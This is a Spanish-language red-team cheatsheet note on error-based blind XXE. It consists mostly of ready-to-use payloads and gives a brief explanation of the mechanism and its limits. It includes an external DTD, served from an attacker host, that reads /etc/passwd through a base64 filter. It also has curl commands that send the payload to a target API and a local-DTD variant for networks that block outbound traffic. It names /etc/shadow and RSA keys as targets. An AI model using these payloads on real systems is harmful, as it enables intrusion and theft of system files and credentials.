---
aliases:
  - Exfiltración Basada en Errores
  - Blind XXE
tags:
  - type/technique
  - vuln/xxe
  - technique/execution
  - asset/web-app
primary categories:
  - '[[Red Team]]'
secondary categories:
  - '[[Explotación]]'
tertiary categories:
  - '[[Web Explotación]]'
kind: SubCheatSheet
linked:
  - '[[XML External Entity (XXE)]]'
---
# XXE - Blind Basado en Errores

***

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/error.dtd"> %xxe;]><foo/>` (+ DTD externo, ver workflow) | Contenido del archivo embebido en el mensaje de error del parser | Verbose errors + egress HTTP permitido. |
| `<!DOCTYPE foo [<!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> <!ENTITY % ISOamso '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"><!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nope/&#x25;file;&#x27;>">&#x25;eval;&#x25;err;'> %local;]><foo/>` | Contenido en error sin necesidad de egress | Total blind (egress bloqueado), DTD local presente. |
| `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/x.dtd"> %xxe;]><foo/>` con DTD que use `convert.base64-encode` | Archivo base64 dentro del error (sortea saltos de línea / chars XML) | Archivo multilinea o con `<`/`&`/`>` (ej: `/etc/shadow`, RSA keys). |
^xxe-blind-errores

### DTD externo (`error.dtd` en tu servidor)

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

### Workflow rápido

```bash
# 1. Levantar servidor con DTD malicioso
python3 -m http.server 8000  # con error.dtd en cwd

# 2. Enviar payload — parser descarga DTD, evalúa entidades, falla con URL malformada que contiene el archivo
curl -X POST https://target/api -H 'Content-Type: application/xml' --data \
  '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR_IP:8000/error.dtd"> %xxe;]><foo/>'
# Respuesta HTTP 500 con: "java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash..."

# 3. Total blind (sin egress): usar DTD local
curl -X POST https://target/api -H 'Content-Type: application/xml' --data @local_dtd_payload.xml
```

___

## Overview

Cuando el servidor procesa XML pero **no refleja el resultado** en la respuesta, se puede forzar al parser a construir una URL malformada que contenga el archivo target. El error que el parser arroja (`FileNotFoundException`, `IOException`, etc.) se filtra al cliente, exponiendo la ruta inválida con los datos embebidos.

### Mecanismo

1. **Entidad parámetro `%file`** lee el archivo target.
2. **Entidad parámetro `%eval`** define dinámicamente una entidad `%error` cuya URL incluye `%file` como path.
3. **`%error`** se evalúa → parser intenta cargar `file:///nope/<contenido>` → arroja excepción con el path completo.

Las entities-defining-entities están prohibidas en el subset DTD **interno** del documento. Por eso se usan DTDs externos o DTDs locales (redefiniendo una entidad existente).

### Limitaciones

- **Errores suprimidos:** si el backend devuelve `HTTP 500 Internal Server Error` genérico sin detalle → técnica falla. Pivotar a [[XXE - Out-of-Band (OOB) y DTDs Externos]].
- **Saltos de línea en archivos:** parsers modernos (Java 8+) abortan ante `\n` en URI antes de imprimir el error completo. Wrapper base64 obligatorio para multiline.
- **Egress bloqueado:** si no hay HTTP saliente → usar [[XXE - DTDs Locales]] para evitar la descarga del DTD externo.

***
